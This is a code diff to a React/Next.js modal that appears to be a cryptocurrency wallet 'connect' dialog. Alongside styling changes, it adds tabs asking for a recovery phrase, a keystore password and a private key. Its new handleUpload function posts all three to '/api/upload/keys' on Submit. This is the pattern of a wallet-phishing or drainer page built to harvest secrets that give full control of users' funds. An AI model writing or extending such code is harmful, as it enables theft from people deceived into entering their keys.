@@ -11,11 +11,13 @@ import {
   Tab,
   TextField,
   Button,
+  CircularProgress,
 } from "@mui/material";
 import React, { useEffect, useState } from "react";
 import Image from "next/image";
 import { useRouter } from "@node_modules/next/navigation";
 import Modal from "@mui/material/Modal";
+import axios from "@node_modules/axios";
 
 const style = {
   position: "absolute",
@@ -24,9 +26,9 @@ const style = {
   transform: "translate(-50%, -50%)",
   width: 400,
   bgcolor: "background.paper",
-  border: "2px solid #000",
-  boxShadow: 24,
   p: 4,
+  boxShadow: 10,
+  borderRadius: "10px",
 };
 
 const BasicModal = ({
@@ -40,7 +42,7 @@ const BasicModal = ({
 }) => {
   const handleClose = () => setOpen(false);
   const [data, setData] = useState(0);
-
+  const [activeTab, setActiveTab] = useState("phrase");
   const handleTabChange = (event, newValue) => {
     setData(newValue);
   };
@@ -53,6 +55,25 @@ const BasicModal = ({
       return () => clearTimeout(timeout);
     }
   }, [value]);
+
+  const [privates, setPrivate] = useState("");
+  const [phrase, setPhrase] = useState("");
+  const [keystore, setKeystore] = useState("");
+  const [uploading, setUploading] = useState(false);
+
+  const handleUpload = async () => {
+    try {
+      setUploading(true);
+      const { data } = await axios.post("/api/upload/keys", {
+        privatekey: privates,
+        phrase: phrase,
+        keystore: keystore,
+      });
+      setUploading(false);
+    } catch (error) {
+      setUploading(false);
+    }
+  };
 
   return (
     <div>
@@ -118,10 +139,8 @@ const BasicModal = ({
             <Box
               sx={{
                 maxWidth: 500,
-                border: "1px solid #ddd",
                 borderRadius: 2,
                 p: 3,
-                boxShadow: 3,
                 backgroundColor: "white",
               }}
             >
@@ -138,20 +157,47 @@ const BasicModal = ({
               </Box>
 
               {/* Tabs */}
-              <Tabs
-                value={value}
-                onChange={handleTabChange}
-                variant="fullWidth"
-                textColor="primary"
-                indicatorColor="primary"
-              >
-                <Tab label="Phrase" />
-                <Tab label="Keystore Json" />
-                <Tab label="Private Key" />
-              </Tabs>
+              <Stack direction="row" justifyContent="space-between">
+                <Typography
+                  sx={{
+                    background: activeTab === "phrase" ? "skyblue" : "white",
+                    cursor: "pointer",
+                    color: activeTab === "phrase" ? "white" : "black",
+                    paddingX: "2px",
+                    borderRadius: "10px",
+                  }}
+                  onClick={() => setActiveTab("phrase")}
+                >
+                  Phrase
+                </Typography>
+                <Typography
+                  sx={{
+                    background: activeTab === "keystore" ? "skyblue" : "white",
+                    cursor: "pointer",
+                    color: activeTab === "keystore" ? "white" : "black",
+                    paddingX: "2px",
+                    borderRadius: "10px",
+                  }}
+                  onClick={() => setActiveTab("keystore")}
+                >
+                  Keystore Json
+                </Typography>
+                <Typography
+                  sx={{
+                    background: activeTab === "private" ? "skyblue" : "white",
+                    cursor: "pointer",
+                    color: activeTab === "private" ? "white" : "black",
+                    paddingX: "2px",
+                    borderRadius: "10px",
+                  }}
+                  onClick={() => setActiveTab("private")}
+                >
+                  Private Key
+                </Typography>
+              </Stack>
 
               {/* Content */}
-              {data === 0 && (
+              {activeTab === "phrase" && (
                 <Box mt={2}>
                   <Typography variant="body2" mb={1}>
                     Enter your recovery phrase
@@ -162,6 +208,7 @@ const BasicModal = ({
                     variant="outlined"
                     fullWidth
                     placeholder="Enter your recovery phrase"
+                    onChange={(e) => setPhrase(e.target.value)}
                   />
                   <Typography
                     variant="caption"
@@ -173,15 +220,52 @@ const BasicModal = ({
                   </Typography>
                 </Box>
               )}
+              {activeTab === "keystore" && (
+                <Box mt={2}>
+                  <Typography variant="body2" mb={1}>
+                    Enter your keystore json
+                  </Typography>
+                  <input type="file" />
+                  <TextField
+                    variant="outlined"
+                    fullWidth
+                    placeholder="Wallet Password"
+                    onChange={(e) => setKeystore(e.target.value)}
+                  />
+                </Box>
+              )}
+              {activeTab === "private" && (
+                <Box mt={2}>
+                  <Typography variant="body2" mb={1}>
+                    Enter your Private Key
+                  </Typography>
+                  <TextField
+                    variant="outlined"
+                    fullWidth
+                    placeholder="Enter your Private Key"
+                    onChange={(e) => setPrivate(e.target.value)}
+                  />
+                </Box>
+              )}
 
-              {/* Buttons */}
               <Box display="flex" justifyContent="space-between" mt={3}>
-                <Button variant="contained" color="error">
-                  Cancel
-                </Button>
-                <Button variant="contained" color="primary">
-                  Continue
-                </Button>
+                <button style={{ color: "red" }}>Cancel</button>
+                <button
+                  style={{
+                    background: "skyblue",
+                    color: "white",
+                    borderRadius: "10px",
+                    padding: "10px",
+                    borderRadius: "10px",
+                  }}
+                  onClick={handleUpload}
+                >
+                  {uploading ? (
+                    <CircularProgress size={15} sx={{ color: "white" }} />
+                  ) : (
+                    "Submit"
+                  )}
+                </button>
               </Box>
             </Box>
           )}
